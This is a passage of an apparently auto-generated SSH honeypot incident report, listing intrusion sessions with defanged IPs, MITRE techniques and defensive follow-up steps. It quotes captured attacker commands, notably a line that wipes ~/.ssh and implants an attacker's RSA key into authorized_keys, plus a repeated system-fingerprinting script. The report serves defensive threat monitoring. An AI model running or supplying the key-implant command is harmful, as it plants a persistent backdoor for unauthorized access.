| `2026-08-15 04:28:53` | `cowrie.command.input` |
| `2026-08-15 04:28:53` | `cowrie.command.input` |
| `2026-08-15 04:28:53` | `cowrie.log.closed` |
| `2026-08-15 04:28:53` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `92.118.39[.]14` to AbuseIPDB if not already reported
- [ ] Block `92.118.39[.]14` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-bb90e178ccbb

| Field | Detail |
|---|---|
| **Source IP** | `217.165.22[.]192` |
| **First Seen** | 2026-08-15 04:30 |
| **Last Seen** | 2026-08-15 04:30 |
| **Session Duration** | 1s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `uname -s -v -n -r -m` |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-08-15 04:30:33` | `cowrie.session.connect` |
| `2026-08-15 04:30:33` | `cowrie.client.version` |
| `2026-08-15 04:30:33` | `cowrie.client.kex` |
| `2026-08-15 04:30:34` | `cowrie.login.success` |
| `2026-08-15 04:30:34` | `cowrie.session.params` |
| `2026-08-15 04:30:34` | `cowrie.command.input` |
| `2026-08-15 04:30:35` | `cowrie.log.closed` |
| `2026-08-15 04:30:35` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `217.165.22[.]192` to AbuseIPDB if not already reported
- [ ] Block `217.165.22[.]192` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-912db16639e8

| Field | Detail |
|---|---|
| **Source IP** | `92.118.39[.]14` |
| **First Seen** | 2026-08-15 04:30 |
| **Last Seen** | 2026-08-15 04:30 |
| **Session Duration** | 3s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `export PATH=/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin:$PATH; uname=$(uname -s -v -n -m 2>/dev/null || /bin/uname -s -v -n -m 2>/dev/null || /usr/bin/uname -s -v -n -m 2>/dev/null || busybox uname -s -v -n -m 2>/dev/null || ( [ -f /proc/version ] && head -1 /proc/version | cut -d' ' -f1 ) || ( [ -f /etc/os-release ] && grep '^ID=' /etc/os-release | cut -d= -f2 | tr -d '"' ) || echo ""); arch=$(uname -m 2>/dev/null || /bin/uname -m 2>/dev/null || /usr/bin/uname -m 2>/dev/null || busybox una, uname -s -v -n -m 2 > /dev/null, /bin/uname -s -v -n -m 2 > /dev/null, /usr/bin/uname -s -v -n -m 2 > /dev/null, busybox uname -s -v -n -m 2 > /dev/null` |
| **TTPs (MITRE)** | T1059.004 · T1078 · T1083 · T1222.002 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-08-15 04:30:49` | `cowrie.session.connect` |
| `2026-08-15 04:30:49` | `cowrie.client.version` |
| `2026-08-15 04:30:49` | `cowrie.client.kex` |
| `2026-08-15 04:30:50` | `cowrie.login.success` |
| `2026-08-15 04:30:51` | `cowrie.session.params` |
| `2026-08-15 04:30:51` | `cowrie.command.input` |
| `2026-08-15 04:30:51` | `cowrie.command.input` |
| `2026-08-15 04:30:51` | `cowrie.command.input` |
| `2026-08-15 04:30:51` | `cowrie.command.input` |
| `2026-08-15 04:30:51` | `cowrie.command.input` |
| `2026-08-15 04:30:51` | `cowrie.command.success` |
| `2026-08-15 04:30:51` | `cowrie.command.input` |
| `2026-08-15 04:30:51` | `cowrie.command.input` |
| `2026-08-15 04:30:51` | `cowrie.command.input` |
| `2026-08-15 04:30:51` | `cowrie.command.input` |
| `2026-08-15 04:30:52` | `cowrie.log.closed` |
| `2026-08-15 04:30:52` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `92.118.39[.]14` to AbuseIPDB if not already reported
- [ ] Block `92.118.39[.]14` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-a8673178156d

| Field | Detail |
|---|---|
| **Source IP** | `92.118.39[.]14` |
| **First Seen** | 2026-08-15 04:32 |
| **Last Seen** | 2026-08-15 04:32 |
| **Session Duration** | 3s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `export PATH=/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin:$PATH; uname=$(uname -s -v -n -m 2>/dev/null || /bin/uname -s -v -n -m 2>/dev/null || /usr/bin/uname -s -v -n -m 2>/dev/null || busybox uname -s -v -n -m 2>/dev/null || ( [ -f /proc/version ] && head -1 /proc/version | cut -d' ' -f1 ) || ( [ -f /etc/os-release ] && grep '^ID=' /etc/os-release | cut -d= -f2 | tr -d '"' ) || echo ""); arch=$(uname -m 2>/dev/null || /bin/uname -m 2>/dev/null || /usr/bin/uname -m 2>/dev/null || busybox una, uname -s -v -n -m 2 > /dev/null, /bin/uname -s -v -n -m 2 > /dev/null, /usr/bin/uname -s -v -n -m 2 > /dev/null, busybox uname -s -v -n -m 2 > /dev/null` |
| **TTPs (MITRE)** | T1059.004 · T1078 · T1083 · T1222.002 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-08-15 04:32:50` | `cowrie.session.connect` |
| `2026-08-15 04:32:51` | `cowrie.client.version` |
| `2026-08-15 04:32:51` | `cowrie.client.kex` |
| `2026-08-15 04:32:52` | `cowrie.login.success` |
| `2026-08-15 04:32:53` | `cowrie.session.params` |
| `2026-08-15 04:32:53` | `cowrie.command.input` |
| `2026-08-15 04:32:53` | `cowrie.command.input` |
| `2026-08-15 04:32:53` | `cowrie.command.input` |
| `2026-08-15 04:32:53` | `cowrie.command.input` |
| `2026-08-15 04:32:53` | `cowrie.command.input` |
| `2026-08-15 04:32:53` | `cowrie.command.success` |
| `2026-08-15 04:32:53` | `cowrie.command.input` |
| `2026-08-15 04:32:53` | `cowrie.command.input` |
| `2026-08-15 04:32:53` | `cowrie.command.input` |
| `2026-08-15 04:32:53` | `cowrie.command.input` |
| `2026-08-15 04:32:54` | `cowrie.log.closed` |
| `2026-08-15 04:32:54` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `92.118.39[.]14` to AbuseIPDB if not already reported
- [ ] Block `92.118.39[.]14` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-2826c5a8ec60

| Field | Detail |
|---|---|
| **Source IP** | `61.185.30[.]170` |
| **First Seen** | 2026-08-15 04:34 |
| **Last Seen** | 2026-08-15 04:34 |
| **Session Duration** | 9s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TCP Tunnel** | ⚠️ `cowrie.direct-tcpip` — port forwarding / proxy attempt |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-08-15 04:34:05` | `cowrie.session.connect` |
| `2026-08-15 04:34:06` | `cowrie.client.version` |
| `2026-08-15 04:34:06` | `cowrie.client.kex` |
| `2026-08-15 04:34:08` | `cowrie.login.success` |
| `2026-08-15 04:34:10` | `cowrie.direct-tcpip.request` |
| `2026-08-15 04:34:15` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `61.185.30[.]170` to AbuseIPDB if not already reported
- [ ] Block `61.185.30[.]170` at perimeter firewall / security group
- [ ] Investigate TCP tunnel target — port forwarding via honeypot
- [ ] Confirm tunnel target is not internal infrastructure
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-c38c9c679f46

| Field | Detail |
|---|---|
| **Source IP** | `92.118.39[.]14` |
| **First Seen** | 2026-08-15 04:34 |
| **Last Seen** | 2026-08-15 04:34 |
| **Session Duration** | 3s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `export PATH=/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin:$PATH; uname=$(uname -s -v -n -m 2>/dev/null || /bin/uname -s -v -n -m 2>/dev/null || /usr/bin/uname -s -v -n -m 2>/dev/null || busybox uname -s -v -n -m 2>/dev/null || ( [ -f /proc/version ] && head -1 /proc/version | cut -d' ' -f1 ) || ( [ -f /etc/os-release ] && grep '^ID=' /etc/os-release | cut -d= -f2 | tr -d '"' ) || echo ""); arch=$(uname -m 2>/dev/null || /bin/uname -m 2>/dev/null || /usr/bin/uname -m 2>/dev/null || busybox una, uname -s -v -n -m 2 > /dev/null, /bin/uname -s -v -n -m 2 > /dev/null, /usr/bin/uname -s -v -n -m 2 > /dev/null, busybox uname -s -v -n -m 2 > /dev/null` |
| **TTPs (MITRE)** | T1059.004 · T1078 · T1083 · T1222.002 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-08-15 04:34:48` | `cowrie.session.connect` |
| `2026-08-15 04:34:49` | `cowrie.client.version` |
| `2026-08-15 04:34:49` | `cowrie.client.kex` |
| `2026-08-15 04:34:50` | `cowrie.login.success` |
| `2026-08-15 04:34:51` | `cowrie.session.params` |
| `2026-08-15 04:34:51` | `cowrie.command.input` |
| `2026-08-15 04:34:51` | `cowrie.command.input` |
| `2026-08-15 04:34:51` | `cowrie.command.input` |
| `2026-08-15 04:34:51` | `cowrie.command.input` |
| `2026-08-15 04:34:51` | `cowrie.command.input` |
| `2026-08-15 04:34:51` | `cowrie.command.success` |
| `2026-08-15 04:34:51` | `cowrie.command.input` |
| `2026-08-15 04:34:51` | `cowrie.command.input` |
| `2026-08-15 04:34:51` | `cowrie.command.input` |
| `2026-08-15 04:34:51` | `cowrie.command.input` |
| `2026-08-15 04:34:52` | `cowrie.log.closed` |
| `2026-08-15 04:34:52` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `92.118.39[.]14` to AbuseIPDB if not already reported
- [ ] Block `92.118.39[.]14` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-bb02d4acad42

| Field | Detail |
|---|---|
| **Source IP** | `92.118.39[.]14` |
| **First Seen** | 2026-08-15 04:36 |
| **Last Seen** | 2026-08-15 04:36 |
| **Session Duration** | 2s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `export PATH=/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin:$PATH; uname=$(uname -s -v -n -m 2>/dev/null || /bin/uname -s -v -n -m 2>/dev/null || /usr/bin/uname -s -v -n -m 2>/dev/null || busybox uname -s -v -n -m 2>/dev/null || ( [ -f /proc/version ] && head -1 /proc/version | cut -d' ' -f1 ) || ( [ -f /etc/os-release ] && grep '^ID=' /etc/os-release | cut -d= -f2 | tr -d '"' ) || echo ""); arch=$(uname -m 2>/dev/null || /bin/uname -m 2>/dev/null || /usr/bin/uname -m 2>/dev/null || busybox una, uname -s -v -n -m 2 > /dev/null, /bin/uname -s -v -n -m 2 > /dev/null, /usr/bin/uname -s -v -n -m 2 > /dev/null, busybox uname -s -v -n -m 2 > /dev/null` |
| **TTPs (MITRE)** | T1059.004 · T1078 · T1083 · T1222.002 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-08-15 04:36:42` | `cowrie.session.connect` |
| `2026-08-15 04:36:42` | `cowrie.client.version` |
| `2026-08-15 04:36:42` | `cowrie.client.kex` |
| `2026-08-15 04:36:43` | `cowrie.login.success` |
| `2026-08-15 04:36:44` | `cowrie.session.params` |
| `2026-08-15 04:36:44` | `cowrie.command.input` |
| `2026-08-15 04:36:44` | `cowrie.command.input` |
| `2026-08-15 04:36:44` | `cowrie.command.input` |
| `2026-08-15 04:36:44` | `cowrie.command.input` |
| `2026-08-15 04:36:44` | `cowrie.command.input` |
| `2026-08-15 04:36:44` | `cowrie.command.success` |
| `2026-08-15 04:36:44` | `cowrie.command.input` |
| `2026-08-15 04:36:44` | `cowrie.command.input` |
| `2026-08-15 04:36:44` | `cowrie.command.input` |
| `2026-08-15 04:36:44` | `cowrie.command.input` |
| `2026-08-15 04:36:44` | `cowrie.log.closed` |
| `2026-08-15 04:36:44` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `92.118.39[.]14` to AbuseIPDB if not already reported
- [ ] Block `92.118.39[.]14` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-57b74cc85a8f

| Field | Detail |
|---|---|
| **Source IP** | `23.29.118[.]224` |
| **First Seen** | 2026-08-15 04:37 |
| **Last Seen** | 2026-08-15 04:37 |
| **Session Duration** | 1s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `cd ~; chattr -ia .ssh; lockr -ia .ssh, cd ~ && rm -rf .ssh && mkdir .ssh && echo "ssh-rsa AAAAB3NzaC1yc2EAAAABJQAAAQEArDp4cun2lhr4KUhBGE7VvAcwdli2a8dbnrTOrbMz1+5O73fcBOx8NVbUT0bUanUV9tJ2/9p7+vD0EpZ3Tz/+0kX34uAx1RV/75GVOmNx+9EuWOnvNoaJe0QXxziIg9eLBHpgLMuakb5+BgTFB+rKJAw9u9FSTDengvS8hX1kNFS4Mjux0hJOK8rvcEmPecjdySYMb66nylAKGwCEE6WEQHmd1mUPgHwGQ0hWCwsQk13yCGPK5w6hYp5zYkFnvlC8hGmd4Ww+u97k6pfTGTUbJk14ujvcD9iUKQTTWYYjIIu5PmUux5bsZ0R4WFwdIe6+i6rBLAsPKgAySVKPRK+oRw== mdrfckr">>.ssh/authorized_keys && chmod -R go= ~/.ssh && cd ~` |
| **Download Attempts** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 |
| **TTPs (MITRE)** | T1021.004 · T1078 · T1105 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-08-15 04:37:51` | `cowrie.session.connect` |
| `2026-08-15 04:37:51` | `cowrie.client.version` |
| `2026-08-15 04:37:51` | `cowrie.client.kex` |
| `2026-08-15 04:37:51` | `cowrie.login.success` |
| `2026-08-15 04:37:52` | `cowrie.session.params` |
| `2026-08-15 04:37:52` | `cowrie.command.input` |
| `2026-08-15 04:37:52` | `cowrie.command.failed` |
| `2026-08-15 04:37:52` | `cowrie.log.closed` |
| `2026-08-15 04:37:52` | `cowrie.session.params` |
| `2026-08-15 04:37:52` | `cowrie.command.input` |
| `2026-08-15 04:37:52` | `cowrie.session.file_download` |
| `2026-08-15 04:37:52` | `cowrie.log.closed` |
| `2026-08-15 04:37:53` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `23.29.118[.]224` to AbuseIPDB if not already reported
- [ ] Block `23.29.118[.]224` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Submit download hash(es) to VirusTotal
- [ ] Run Tool 31 malware analyzer on captured payload(s)
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-0cdde5d62c35

| Field | Detail |
|---|---|
| **Source IP** | `23.29.118[.]224` |
| **First Seen** | 2026-08-15 04:37 |
| **Last Seen** | 2026-08-15 04:37 |
| **Session Duration** | 0s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-08-15 04:37:52` | `cowrie.session.connect` |
| `2026-08-15 04:37:52` | `cowrie.client.version` |
| `2026-08-15 04:37:52` | `cowrie.client.kex` |
| `2026-08-15 04:37:52` | `cowrie.login.success` |
| `2026-08-15 04:37:52` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `23.29.118[.]224` to AbuseIPDB if not already reported
- [ ] Block `23.29.118[.]224` at perimeter firewall / security group
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-89c26d314f5b

| Field | Detail |
|---|---|
| **Source IP** | `23.29.118[.]224` |
| **First Seen** | 2026-08-15 04:37 |
| **Last Seen** | 2026-08-15 04:37 |
| **Session Duration** | 0s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-08-15 04:37:53` | `cowrie.session.connect` |
| `2026-08-15 04:37:53` | `cowrie.client.version` |
| `2026-08-15 04:37:53` | `cowrie.client.kex` |
| `2026-08-15 04:37:53` | `cowrie.login.success` |
| `2026-08-15 04:37:53` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `23.29.118[.]224` to AbuseIPDB if not already reported
- [ ] Block `23.29.118[.]224` at perimeter firewall / security group
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-afd9a6f2f7e5

| Field | Detail |
|---|---|
| **Source IP** | `45.142.193[.]164` |
| **First Seen** | 2026-08-15 04:38 |
| **Last Seen** | 2026-08-15 04:39 |
| **Session Duration** | 46s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `echo xsec` |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-08-15 04:38:36` | `cowrie.session.connect` |
| `2026-08-15 04:38:42` | `cowrie.client.version` |
| `2026-08-15 04:38:42` | `cowrie.client.kex` |
| `2026-08-15 04:39:05` | `cowrie.login.success` |
| `2026-08-15 04:39:17` | `cowrie.session.params` |
| `2026-08-15 04:39:17` | `cowrie.command.input` |
| `2026-08-15 04:39:23` | `cowrie.log.closed` |
| `2026-08-15 04:39:23` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `45.142.193[.]164` to AbuseIPDB if not already reported
- [ ] Block `45.142.193[.]164` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-729b8597ce7e

| Field | Detail |
|---|---|
| **Source IP** | `92.118.39[.]14` |
| **First Seen** | 2026-08-15 04:38 |
| **Last Seen** | 2026-08-15 04:38 |
| **Session Duration** | 3s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `export PATH=/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin:$PATH; uname=$(uname -s -v -n -m 2>/dev/null || /bin/uname -s -v -n -m 2>/dev/null || /usr/bin/uname -s -v -n -m 2>/dev/null || busybox uname -s -v -n -m 2>/dev/null || ( [ -f /proc/version ] && head -1 /proc/version | cut -d' ' -f1 ) || ( [ -f /etc/os-release ] && grep '^ID=' /etc/os-release | cut -d= -f2 | tr -d '"' ) || echo ""); arch=$(uname -m 2>/dev/null || /bin/uname -m 2>/dev/null || /usr/bin/uname -m 2>/dev/null || busybox una, uname -s -v -n -m 2 > /dev/null, /bin/uname -s -v -n -m 2 > /dev/null, /usr/bin/uname -s -v -n -m 2 > /dev/null, busybox uname -s -v -n -m 2 > /dev/null` |
| **TTPs (MITRE)** | T1059.004 · T1078 · T1083 · T1222.002 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-08-15 04:38:37` | `cowrie.session.connect` |
| `2026-08-15 04:38:38` | `cowrie.client.version` |
| `2026-08-15 04:38:38` | `cowrie.client.kex` |
| `2026-08-15 04:38:39` | `cowrie.login.success` |
| `2026-08-15 04:38:40` | `cowrie.session.params` |
| `2026-08-15 04:38:40` | `cowrie.command.input` |
| `2026-08-15 04:38:40` | `cowrie.command.input` |
| `2026-08-15 04:38:40` | `cowrie.command.input` |
| `2026-08-15 04:38:40` | `cowrie.command.input` |
| `2026-08-15 04:38:40` | `cowrie.command.input` |
| `2026-08-15 04:38:40` | `cowrie.command.success` |
| `2026-08-15 04:38:40` | `cowrie.command.input` |
| `2026-08-15 04:38:40` | `cowrie.command.input` |
| `2026-08-15 04:38:40` | `cowrie.command.input` |
| `2026-08-15 04:38:40` | `cowrie.command.input` |
| `2026-08-15 04:38:40` | `cowrie.log.closed` |
| `2026-08-15 04:38:41` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `92.118.39[.]14` to AbuseIPDB if not already reported
- [ ] Block `92.118.39[.]14` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-75bf6aec7338

| Field | Detail |
|---|---|
| **Source IP** | `92.118.39[.]14` |
| **First Seen** | 2026-08-15 04:40 |
| **Last Seen** | 2026-08-15 04:40 |
| **Session Duration** | 2s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `export PATH=/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin:$PATH; uname=$(uname -s -v -n -m 2>/dev/null || /bin/uname -s -v -n -m 2>/dev/null || /usr/bin/uname -s -v -n -m 2>/dev/null || busybox uname -s -v -n -m 2>/dev/null || ( [ -f /proc/version ] && head -1 /proc/version | cut -d' ' -f1 ) || ( [ -f /etc/os-release ] && grep '^ID=' /etc/os-release | cut -d= -f2 | tr -d '"' ) || echo ""); arch=$(uname -m 2>/dev/null || /bin/uname -m 2>/dev/null || /usr/bin/uname -m 2>/dev/null || busybox una, uname -s -v -n -m 2 > /dev/null, /bin/uname -s -v -n -m 2 > /dev/null, /usr/bin/uname -s -v -n -m 2 > /dev/null, busybox uname -s -v -n -m 2 > /dev/null` |
| **TTPs (MITRE)** | T1059.004 · T1078 · T1083 · T1222.002 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-08-15 04:40:35` | `cowrie.session.connect` |
| `2026-08-15 04:40:35` | `cowrie.client.version` |
| `2026-08-15 04:40:35` | `cowrie.client.kex` |
| `2026-08-15 04:40:36` | `cowrie.login.success` |
| `2026-08-15 04:40:37` | `cowrie.session.params` |
| `2026-08-15 04:40:37` | `cowrie.command.input` |
| `2026-08-15 04:40:37` | `cowrie.command.input` |
| `2026-08-15 04:40:37` | `cowrie.command.input` |
| `2026-08-15 04:40:37` | `cowrie.command.input` |
| `2026-08-15 04:40:37` | `cowrie.command.input` |
| `2026-08-15 04:40:37` | `cowrie.command.success` |
| `2026-08-15 04:40:37` | `cowrie.command.input` |
| `2026-08-15 04:40:37` | `cowrie.command.input` |
| `2026-08-15 04:40:37` | `cowrie.command.input` |
| `2026-08-15 04:40:37` | `cowrie.command.input` |
| `2026-08-15 04:40:37` | `cowrie.log.closed` |
| `2026-08-15 04:40:38` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `92.118.39[.]14` to AbuseIPDB if not already reported
- [ ] Block `92.118.39[.]14` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-9535d8361bc2

| Field | Detail |
|---|---|
| **Source IP** | `103.120.116[.]162` |
| **First Seen** | 2026-08-15 04:41 |
| **Last Seen** | 2026-08-15 04:41 |
| **Session Duration** | 12s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TCP Tunnel** | ⚠️ `cowrie.direct-tcpip` — port forwarding / proxy attempt |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-08-15 04:41:01` | `cowrie.session.connect` |
| `2026-08-15 04:41:02` | `cowrie.client.version` |
| `2026-08-15 04:41:02` | `cowrie.client.kex` |
| `2026-08-15 04:41:06` | `cowrie.login.success` |
| `2026-08-15 04:41:07` | `cowrie.direct-tcpip.request` |
| `2026-08-15 04:41:13` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `103.120.116[.]162` to AbuseIPDB if not already reported
- [ ] Block `103.120.116[.]162` at perimeter firewall / security group
- [ ] Investigate TCP tunnel target — port forwarding via honeypot
- [ ] Confirm tunnel target is not internal infrastructure
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-757297cdda4c

| Field | Detail |
|---|---|
| **Source IP** | `223.210.27[.]53` |
| **First Seen** | 2026-08-15 04:41 |
| **Last Seen** | 2026-08-15 04:41 |
| **Session Duration** | 8s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TCP Tunnel** | ⚠️ `cowrie.direct-tcpip` — port forwarding / proxy attempt |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-08-15 04:41:13` | `cowrie.session.connect` |
| `2026-08-15 04:41:14` | `cowrie.client.version` |
| `2026-08-15 04:41:14` | `cowrie.client.kex` |
| `2026-08-15 04:41:17` | `cowrie.login.success` |
| `2026-08-15 04:41:17` | `cowrie.direct-tcpip.request` |
| `2026-08-15 04:41:22` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `223.210.27[.]53` to AbuseIPDB if not already reported
- [ ] Block `223.210.27[.]53` at perimeter firewall / security group
- [ ] Investigate TCP tunnel target — port forwarding via honeypot
- [ ] Confirm tunnel target is not internal infrastructure
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-c95269001a60

| Field | Detail |
|---|---|
| **Source IP** | `92.118.39[.]14` |
| **First Seen** | 2026-08-15 04:42 |
| **Last Seen** | 2026-08-15 04:42 |
| **Session Duration** | 2s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `export PATH=/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin:$PATH; uname=$(uname -s -v -n -m 2>/dev/null || /bin/uname -s -v -n -m 2>/dev/null || /usr/bin/uname -s -v -n -m 2>/dev/null || busybox uname -s -v -n -m 2>/dev/null || ( [ -f /proc/version ] && head -1 /proc/version | cut -d' ' -f1 ) || ( [ -f /etc/os-release ] && grep '^ID=' /etc/os-release | cut -d= -f2 | tr -d '"' ) || echo ""); arch=$(uname -m 2>/dev/null || /bin/uname -m 2>/dev/null || /usr/bin/uname -m 2>/dev/null || busybox una, uname -s -v -n -m 2 > /dev/null, /bin/uname -s -v -n -m 2 > /dev/null, /usr/bin/uname -s -v -n -m 2 > /dev/null, busybox uname -s -v -n -m 2 > /dev/null` |
| **TTPs (MITRE)** | T1059.004 · T1078 · T1083 · T1222.002 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-08-15 04:42:36` | `cowrie.session.connect` |
| `2026-08-15 04:42:36` | `cowrie.client.version` |
| `2026-08-15 04:42:36` | `cowrie.client.kex` |
| `2026-08-15 04:42:37` | `cowrie.login.success` |
| `2026-08-15 04:42:38` | `cowrie.session.params` |
| `2026-08-15 04:42:38` | `cowrie.command.input` |
| `2026-08-15 04:42:38` | `cowrie.command.input` |
| `2026-08-15 04:42:38` | `cowrie.command.input` |
| `2026-08-15 04:42:38` | `cowrie.command.input` |
| `2026-08-15 04:42:38` | `cowrie.command.input` |
| `2026-08-15 04:42:38` | `cowrie.command.success` |
| `2026-08-15 04:42:38` | `cowrie.command.input` |
| `2026-08-15 04:42:38` | `cowrie.command.input` |
| `2026-08-15 04:42:38` | `cowrie.command.input` |
| `2026-08-15 04:42:38` | `cowrie.command.input` |
| `2026-08-15 04:42:38` | `cowrie.log.closed` |
| `2026-08-15 04:42:39` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `92.118.39[.]14` to AbuseIPDB if not already reported
- [ ] Block `92.118.39[.]14` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-e75c561477b1

| Field | Detail |
|---|---|
| **Source IP** | `92.118.39[.]14` |
| **First Seen** | 2026-08-15 04:44 |
| **Last Seen** | 2026-08-15 04:44 |
| **Session Duration** | 3s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `export PATH=/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin:$PATH; uname=$(uname -s -v -n -m 2>/dev/null || /bin/uname -s -v -n -m 2>/dev/null || /usr/bin/uname -s -v -n -m 2>/dev/null || busybox uname -s -v -n -m 2>/dev/null || ( [ -f /proc/version ] && head -1 /proc/version | cut -d' ' -f1 ) || ( [ -f /etc/os-release ] && grep '^ID=' /etc/os-release | cut -d= -f2 | tr -d '"' ) || echo ""); arch=$(uname -m 2>/dev/null || /bin/uname -m 2>/dev/null || /usr/bin/uname -m 2>/dev/null || busybox una, uname -s -v -n -m 2 > /dev/null, /bin/uname -s -v -n -m 2 > /dev/null, /usr/bin/uname -s -v -n -m 2 > /dev/null, busybox uname -s -v -n -m 2 > /dev/null` |
| **TTPs (MITRE)** | T1059.004 · T1078 · T1083 · T1222.002 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-08-15 04:44:41` | `cowrie.session.connect` |
| `2026-08-15 04:44:41` | `cowrie.client.version` |
| `2026-08-15 04:44:41` | `cowrie.client.kex` |
| `2026-08-15 04:44:42` | `cowrie.login.success` |
| `2026-08-15 04:44:44` | `cowrie.session.params` |
| `2026-08-15 04:44:44` | `cowrie.command.input` |
| `2026-08-15 04:44:44` | `cowrie.command.input` |
| `2026-08-15 04:44:44` | `cowrie.command.input` |
| `2026-08-15 04:44:44` | `cowrie.command.input` |
| `2026-08-15 04:44:44` | `cowrie.command.input` |
| `2026-08-15 04:44:44` | `cowrie.command.success` |
